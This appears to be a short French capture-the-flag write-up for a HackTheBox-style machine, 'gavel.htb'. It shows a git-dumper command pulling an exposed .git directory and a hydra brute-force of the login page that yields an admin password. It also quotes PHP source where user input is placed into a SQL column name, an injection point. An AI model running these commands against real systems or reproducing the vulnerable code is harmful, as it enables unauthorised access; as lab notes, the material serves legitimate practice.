![[IMG-20251213011002825.png]]

![[IMG-20251214003738176.png]]
```
git-dumper http://gavel.htb/.git/ ./dump
```

![[IMG-20251214003749687.png]]
![[IMG-20251214003922760.png]]

Admin username = auctioneer

```
hydra -l auctioneer -P /opt/lists/rockyou.txt gavel.htb http-post-form "/login.php:username=^USER^&password=^PASS^::S=302" 
```

![[IMG-20251214003657731.png]]

```
auctioneer:midnight1
```

OU

Dans le code source on a:
```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    $results = [];
}
```
